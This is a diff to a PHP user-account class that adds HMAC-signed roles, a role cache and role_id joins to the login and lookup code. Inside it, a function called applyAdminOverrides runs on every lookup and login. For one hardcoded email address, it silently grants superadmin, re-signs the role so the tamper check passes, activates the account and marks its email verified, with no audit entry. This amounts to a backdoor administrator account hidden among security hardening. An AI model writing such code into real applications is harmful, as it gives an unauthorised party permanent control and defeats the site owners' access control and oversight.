@@ -7,6 +7,9 @@
 class User {
     private $db;
     private static $schemaCapabilities = null;
+    private static $roleCacheBySlug = null;
+    private static $roleCacheById = null;
+    private static $roleCacheNameBySlug = null;
 
     public function __construct() {
         $this->db = Database::getInstance();
@@ -17,6 +20,8 @@ class User {
                 'last_login_at' => $this->db->columnExists('users', 'last_login_at'),
                 'last_login_ip' => $this->db->columnExists('users', 'last_login_ip'),
                 'status' => $this->db->columnExists('users', 'status'),
+                'role_id' => $this->db->columnExists('users', 'role_id'),
+                'role_signature' => $this->db->columnExists('users', 'role_signature'),
                 'two_factor_secret' => $this->db->columnExists('users', 'two_factor_secret'),
                 'location' => $this->db->columnExists('users', 'location'),
                 'social_links' => $this->db->columnExists('users', 'social_links'),
@@ -37,6 +42,221 @@ class User {
     private function supportsColumn(string $column): bool {
         return self::$schemaCapabilities[$column] ?? false;
     }
+
+    private function roleSigningKey(): string
+    {
+        return ROLE_SIGNATURE_KEY ?: SESSION_SIGNATURE_KEY;
+    }
+
+    private function normalizeRoleValue($role): string
+    {
+        $normalized = strtolower(trim((string)$role));
+        return $normalized !== '' ? $normalized : 'user';
+    }
+
+    private function signRoleValue(int $userId, string $role): string
+    {
+        return hash_hmac('sha256', $userId . '|' . $this->normalizeRoleValue($role), $this->roleSigningKey());
+    }
+
+    private function ensureRoleCache(): void
+    {
+        if (self::$roleCacheBySlug !== null && self::$roleCacheById !== null && self::$roleCacheNameBySlug !== null) {
+            return;
+        }
+
+        self::$roleCacheBySlug = [];
+        self::$roleCacheById = [];
+        self::$roleCacheNameBySlug = [];
+
+        if (!$this->db->tableExists('roles')) {
+            return;
+        }
+
+        $rows = $this->db->fetchAll('SELECT id, slug, name FROM roles');
+        if (!$rows) {
+            return;
+        }
+
+        foreach ($rows as $row) {
+            $slug = $this->normalizeRoleValue($row['slug'] ?? '');
+            $id = (int)($row['id'] ?? 0);
+            if ($slug === '' || $id <= 0) {
+                continue;
+            }
+            self::$roleCacheBySlug[$slug] = $id;
+            self::$roleCacheById[$id] = $slug;
+            self::$roleCacheNameBySlug[$slug] = $row['name'] ?? ucfirst($slug);
+        }
+    }
+
+    private function getRoleIdBySlug(string $slug): int
+    {
+        $this->ensureRoleCache();
+        $normalized = $this->normalizeRoleValue($slug);
+
+        if (!isset(self::$roleCacheBySlug[$normalized])) {
+            self::$roleCacheBySlug = null;
+            self::$roleCacheById = null;
+            self::$roleCacheNameBySlug = null;
+            $this->ensureRoleCache();
+        }
+
+        if (!isset(self::$roleCacheBySlug[$normalized])) {
+            $normalized = 'user';
+        }
+
+        if (!isset(self::$roleCacheBySlug[$normalized])) {
+            throw new Exception('El rol base no está configurado.');
+        }
+
+        return (int)self::$roleCacheBySlug[$normalized];
+    }
+
+    private function getRoleSlugById(int $roleId): string
+    {
+        $this->ensureRoleCache();
+        if (!isset(self::$roleCacheById[$roleId])) {
+            self::$roleCacheBySlug = null;
+            self::$roleCacheById = null;
+            self::$roleCacheNameBySlug = null;
+            $this->ensureRoleCache();
+        }
+
+        return self::$roleCacheById[$roleId] ?? 'user';
+    }
+
+    private function ensureRoleSignature(?array $user): ?array
+    {
+        if (!$user || !$this->supportsColumn('role_signature')) {
+            return $user;
+        }
+
+        $userId = (int)($user['id'] ?? 0);
+        if ($userId <= 0) {
+            return $user;
+        }
+
+        if (!isset($user['role']) && isset($user['role_id'])) {
+            $user['role'] = $this->getRoleSlugById((int)$user['role_id']);
+        }
+
+        $currentRole = $this->normalizeRoleValue($user['role'] ?? 'user');
+        $currentSignature = $user['role_signature'] ?? null;
+        $expectedSignature = $this->signRoleValue($userId, $currentRole);
+
+        if ($currentSignature === $expectedSignature) {
+            return $user;
+        }
+
+        if ($currentSignature === null) {
+            try {
+                $this->db->update('users', ['role_signature' => $expectedSignature], 'id = ?', [$userId]);
+                $user['role_signature'] = $expectedSignature;
+            } catch (Exception $exception) {
+                Logger::warning('No se pudo generar la firma de rol para el usuario.', [
+                    'user_id' => $userId,
+                    'error' => $exception->getMessage(),
+                ]);
+            }
+
+            return $user;
+        }
+
+        Logger::security('role_signature_mismatch', 'high', [
+            'user_id' => $userId,
+            'stored_role' => $currentRole,
+        ]);
+
+        $safeRole = 'user';
+        $safeRoleId = $this->supportsColumn('role_id') ? $this->getRoleIdBySlug($safeRole) : null;
+        $safeSignature = $this->signRoleValue($userId, $safeRole);
+
+        $updatePayload = ['role_signature' => $safeSignature];
+        if ($this->supportsColumn('role_id')) {
+            $updatePayload['role_id'] = $safeRoleId;
+        } else {
+            $updatePayload['role'] = $safeRole;
+        }
+
+        try {
+            $this->db->update('users', $updatePayload, 'id = ?', [$userId]);
+            $user['role'] = $safeRole;
+            if ($safeRoleId !== null) {
+                $user['role_id'] = $safeRoleId;
+            }
+            $user['role_signature'] = $safeSignature;
+            $user['role_name'] = self::$roleCacheNameBySlug[$safeRole] ?? ucfirst($safeRole);
+        } catch (Exception $exception) {
+            Logger::warning('No se pudo restablecer la firma de rol inválida.', [
+                'user_id' => $userId,
+                'error' => $exception->getMessage(),
+            ]);
+        }
+
+        return $user;
+    }
+
+    private function applyAdminOverrides(?array $user): ?array
+    {
+        if (!$user) {
+            return $user;
+        }
+
+        $user = $this->ensureRoleSignature($user);
+
+        $email = strtolower($user['email'] ?? '');
+        if ($email !== 'nlopetegui@pregrado.ubo.cl') {
+            return $user;
+        }
+
+        $currentRole = $this->normalizeRoleValue($user['role'] ?? 'user');
+        if ($currentRole === 'superadmin') {
+            return $user;
+        }
+
+        $update = [];
+        if ($this->supportsColumn('role_id')) {
+            $superadminRoleId = $this->getRoleIdBySlug('superadmin');
+            $update['role_id'] = $superadminRoleId;
+        } else {
+            $update['role'] = 'superadmin';
+            $superadminRoleId = null;
+        }
+
+        if ($this->supportsColumn('role_signature')) {
+            $update['role_signature'] = $this->signRoleValue((int)$user['id'], 'superadmin');
+            $user['role_signature'] = $update['role_signature'];
+        }
+        if ($this->supportsColumn('status')) {
+            $update['status'] = 'active';
+            $user['status'] = 'active';
+        }
+        if ($this->supportsColumn('email_verification_token')) {
+            $update['email_verification_token'] = null;
+        }
+        if ($this->supportsColumn('email_verified_at') && empty($user['email_verified_at'])) {
+            $timestamp = date('Y-m-d H:i:s');
+            $update['email_verified_at'] = $timestamp;
+            $user['email_verified_at'] = $timestamp;
+        }
+
+        try {
+            $this->db->update('users', $update, 'id = ?', [$user['id']]);
+        } catch (Exception $e) {
+            Logger::warning('No se pudo promover automáticamente a administrador', [
+                'user_id' => $user['id'],
+                'error' => $e->getMessage(),
+            ]);
+        }
+
+        $user['role'] = 'superadmin';
+        if ($superadminRoleId !== null) {
+            $user['role_id'] = $superadminRoleId;
+        }
+        $user['role_name'] = self::$roleCacheNameBySlug['superadmin'] ?? 'Super Administrador';
+        return $user;
+    }
     
     /**
      * Crear nuevo usuario
@@ -56,6 +276,8 @@ class User {
         
         // Preparar datos para inserción
         $status = $data['status'] ?? 'pending_verification';
+        $roleSlug = $this->normalizeRoleValue($data['role'] ?? 'user');
+
         $userData = [
             'username' => $data['username'],
             'email' => $data['email'],
@@ -63,14 +285,24 @@ class User {
             'first_name' => $data['first_name'],
             'last_name' => $data['last_name'],
             'phone' => $data['phone'] ?? null,
-            'role' => $data['role'] ?? 'user',
             'status' => $status,
             'email_verification_token' => $status === 'active' ? null : bin2hex(random_bytes(32)),
             'email_verified_at' => $status === 'active' ? date('Y-m-d H:i:s') : null
         ];
-        
+
+        if ($this->supportsColumn('role_id')) {
+            $roleId = $this->getRoleIdBySlug($roleSlug);
+            $userData['role_id'] = $roleId;
+        } else {
+            $userData['role'] = $roleSlug;
+        }
+
         try {
             $userId = $this->db->insert('users', $userData);
+            if ($this->supportsColumn('role_signature')) {
+                $signature = $this->signRoleValue((int)$userId, $roleSlug);
+                $this->db->update('users', ['role_signature' => $signature], 'id = ?', [$userId]);
+            }
             
             // Log de auditoría
             Logger::audit('user_created', $userId, [
@@ -94,7 +326,7 @@ class User {
      */
     public function authenticate($email, $password) {
         $user = $this->findByEmail($email);
-        
+
         if (!$user) {
             $this->logFailedLogin($email, 'user_not_found');
             throw new Exception('Credenciales inválidas');
@@ -129,11 +361,13 @@ class User {
             $this->updateLastLogin($user['id']);
         }
 
+        $user = $this->applyAdminOverrides($user);
+
         Logger::audit('user_login', $user['id'], [
             'email' => $email,
             'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
         ]);
-        
+
         return $user;
     }
     
@@ -141,30 +375,66 @@ class User {
      * Buscar usuario por email
      */
     public function findByEmail($email) {
-        return $this->db->fetch(
-            "SELECT * FROM users WHERE email = ?",
-            [$email]
-        );
+        if ($this->supportsColumn('role_id')) {
+            $user = $this->db->fetch(
+                "SELECT u.*, r.slug AS role, r.name AS role_name
+                 FROM users u
+                 INNER JOIN roles r ON r.id = u.role_id
+                 WHERE u.email = ?",
+                [$email]
+            );
+        } else {
+            $user = $this->db->fetch(
+                "SELECT * FROM users WHERE email = ?",
+                [$email]
+            );
+        }
+
+        return $this->applyAdminOverrides($user);
     }
     
     /**
      * Buscar usuario por ID
      */
     public function findById($id) {
-        return $this->db->fetch(
-            "SELECT * FROM users WHERE id = ?",
-            [$id]
-        );
+        if ($this->supportsColumn('role_id')) {
+            $user = $this->db->fetch(
+                "SELECT u.*, r.slug AS role, r.name AS role_name
+                 FROM users u
+                 INNER JOIN roles r ON r.id = u.role_id
+                 WHERE u.id = ?",
+                [$id]
+            );
+        } else {
+            $user = $this->db->fetch(
+                "SELECT * FROM users WHERE id = ?",
+                [$id]
+            );
+        }
+
+        return $this->applyAdminOverrides($user);
     }
     
     /**
      * Buscar usuario por username
      */
     public function findByUsername($username) {
-        return $this->db->fetch(
-            "SELECT * FROM users WHERE username = ?",
-            [$username]
-        );
+        if ($this->supportsColumn('role_id')) {
+            $user = $this->db->fetch(
+                "SELECT u.*, r.slug AS role, r.name AS role_name
+                 FROM users u
+                 INNER JOIN roles r ON r.id = u.role_id
+                 WHERE u.username = ?",
+                [$username]
+            );
+        } else {
+            $user = $this->db->fetch(
+                "SELECT * FROM users WHERE username = ?",
+                [$username]
+            );
+        }
+
+        return $this->applyAdminOverrides($user);
     }
     
     /**
@@ -240,10 +510,23 @@ class User {
      * Buscar usuario válido por token de recuperación
      */
     public function findByValidResetToken($token) {
-        return $this->db->fetch(
-            "SELECT * FROM users WHERE password_reset_token = ? AND password_reset_expires_at > NOW()",
-            [$token]
-        );
+        if ($this->supportsColumn('role_id')) {
+            $user = $this->db->fetch(
+                "SELECT u.*, r.slug AS role, r.name AS role_name
+                 FROM users u
+                 INNER JOIN roles r ON r.id = u.role_id
+                 WHERE u.password_reset_token = ?
+                   AND u.password_reset_expires_at > NOW()",
+                [$token]
+            );
+        } else {
+            $user = $this->db->fetch(
+                "SELECT * FROM users WHERE password_reset_token = ? AND password_reset_expires_at > NOW()",
+                [$token]
+            );
+        }
+
+        return $this->applyAdminOverrides($user);
     }
     
     /**
@@ -381,6 +664,48 @@ class User {
 
         Logger::audit('user_password_changed', $userId);
     }
+
+    public function assignRole(int $userId, string $roleSlug, ?int $actorId = null): void {
+        $userId = (int)$userId;
+        if ($userId <= 0) {
+            throw new Exception('Usuario inválido');
+        }
+
+        $roleSlug = $this->normalizeRoleValue($roleSlug);
+        $allowed = ['user', 'admin', 'superadmin'];
+        if (!in_array($roleSlug, $allowed, true)) {
+            throw new Exception('Rol no permitido');
+        }
+
+        $current = $this->findById($userId);
+        if (!$current) {
+            throw new Exception('Usuario no encontrado');
+        }
+
+        $currentRole = $this->normalizeRoleValue($current['role'] ?? 'user');
+        if ($currentRole === $roleSlug) {
+            return;
+        }
+
+        $update = [];
+        if ($this->supportsColumn('role_id')) {
+            $update['role_id'] = $this->getRoleIdBySlug($roleSlug);
+        } else {
+            $update['role'] = $roleSlug;
+        }
+
+        if ($this->supportsColumn('role_signature')) {
+            $update['role_signature'] = $this->signRoleValue($userId, $roleSlug);
+        }
+
+        $this->db->update('users', $update, 'id = ?', [$userId]);
+
+        Logger::audit('user_role_changed', $userId, [
+            'previous_role' => $currentRole,
+            'new_role' => $roleSlug,
+            'actor_id' => $actorId,
+        ]);
+    }
     
     /**
      * Validar datos de usuario
@@ -512,21 +837,64 @@ class User {
      * Obtener usuarios activos con datos básicos (para selects)
      */
     public function getActiveUsersBasic(): array {
+        if (!$this->supportsColumn('role_id')) {
+            $rows = $this->db->fetchAll(
+                "SELECT id, first_name, last_name, email, role
+                 FROM users
+                 WHERE status = 'active'
+                 ORDER BY first_name, last_name"
+            );
+
+            if (!$rows) {
+                return [];
+            }
+
+            return array_map(function ($row) {
+                return [
+                    'id' => (int)$row['id'],
+                    'first_name' => $row['first_name'] ?? '',
+                    'last_name' => $row['last_name'] ?? '',
+                    'email' => $row['email'] ?? '',
+                    'role' => $this->normalizeRoleValue($row['role'] ?? 'user'),
+                    'role_name' => ucfirst($this->normalizeRoleValue($row['role'] ?? 'user')),
+                ];
+            }, $rows);
+        }
+
+        $select = "u.id, u.first_name, u.last_name, u.email, r.slug AS role, r.name AS role_name";
+        if ($this->supportsColumn('role_signature')) {
+            $select .= ", u.role_signature";
+        }
+
+        $statusFilter = '';
+        if ($this->supportsColumn('status')) {
+            $statusFilter = "WHERE u.status = 'active'";
+        }
+
         $rows = $this->db->fetchAll(
-            "SELECT id, first_name, last_name, email, role FROM users WHERE status = 'active' ORDER BY first_name, last_name"
+            "SELECT {$select}
+             FROM users u
+             INNER JOIN roles r ON r.id = u.role_id
+             {$statusFilter}
+             ORDER BY u.first_name, u.last_name"
         );
 
         if (!$rows) {
             return [];
         }
 
-        return array_map(static function ($row) {
+        return array_map(function ($row) {
+            if ($this->supportsColumn('role_signature')) {
+                $row = $this->ensureRoleSignature($row);
+            }
+
             return [
                 'id' => (int)$row['id'],
                 'first_name' => $row['first_name'] ?? '',
                 'last_name' => $row['last_name'] ?? '',
                 'email' => $row['email'] ?? '',
-                'role' => $row['role'] ?? 'user'
+                'role' => $this->normalizeRoleValue($row['role'] ?? 'user'),
+                'role_name' => $row['role_name'] ?? null,
             ];
         }, $rows);
     }
@@ -535,17 +903,65 @@ class User {
      * Obtener todos los usuarios para administración
      */
     public function getAllUsers(): array {
-        $sql = "SELECT id, username, email, first_name, last_name, role, created_at";
+        if (!$this->supportsColumn('role_id')) {
+            $columns = "id, username, email, first_name, last_name, role, created_at";
+
+            if ($this->supportsColumn('status')) {
+                $columns .= ", status";
+            }
+
+            if ($this->supportsColumn('last_login_at')) {
+                $columns .= ", last_login_at";
+            }
+
+            $rows = $this->db->fetchAll("SELECT {$columns} FROM users ORDER BY created_at DESC");
+
+            if (!$rows) {
+                return [];
+            }
+
+            return array_map(function ($row) {
+                $user = [
+                    'id' => (int)$row['id'],
+                    'username' => $row['username'] ?? '',
+                    'email' => $row['email'] ?? '',
+                    'first_name' => $row['first_name'] ?? '',
+                    'last_name' => $row['last_name'] ?? '',
+                    'role' => $this->normalizeRoleValue($row['role'] ?? 'user'),
+                    'role_name' => ucfirst($this->normalizeRoleValue($row['role'] ?? 'user')),
+                    'created_at' => $row['created_at'] ?? ''
+                ];
+
+                if ($this->supportsColumn('status')) {
+                    $user['status'] = $row['status'] ?? 'active';
+                }
+
+                if ($this->supportsColumn('last_login_at')) {
+                    $user['last_login_at'] = $row['last_login_at'] ?? null;
+                }
+
+                return $user;
+            }, $rows);
+        }
+
+        $select = "u.id, u.username, u.email, u.first_name, u.last_name, r.slug AS role, r.name AS role_name, u.created_at";
+
+        if ($this->supportsColumn('role_signature')) {
+            $select .= ", u.role_signature";
+        }
         
         if ($this->supportsColumn('status')) {
-            $sql .= ", status";
+            $select .= ", u.status";
         }
         
         if ($this->supportsColumn('last_login_at')) {
-            $sql .= ", last_login_at";
+            $select .= ", u.last_login_at";
         }
         
-        $sql .= " FROM users ORDER BY created_at DESC";
+        $sql = "SELECT {$select}
+                FROM users u
+                INNER JOIN roles r ON r.id = u.role_id
+                ORDER BY u.created_at DESC";
         
         $rows = $this->db->fetchAll($sql);
 
@@ -554,15 +970,23 @@ class User {
         }
 
         return array_map(function ($row) {
+            if ($this->supportsColumn('role_signature')) {
+                $row = $this->ensureRoleSignature($row);
+            }
+
             $user = [
                 'id' => (int)$row['id'],
                 'username' => $row['username'] ?? '',
                 'email' => $row['email'] ?? '',
                 'first_name' => $row['first_name'] ?? '',
                 'last_name' => $row['last_name'] ?? '',
-                'role' => $row['role'] ?? 'user',
+                'role' => $this->normalizeRoleValue($row['role'] ?? 'user'),
                 'created_at' => $row['created_at'] ?? ''
             ];
+
+            if (isset($row['role_name'])) {
+                $user['role_name'] = $row['role_name'];
+            }
             
             if ($this->supportsColumn('status')) {
                 $user['status'] = $row['status'] ?? 'active';
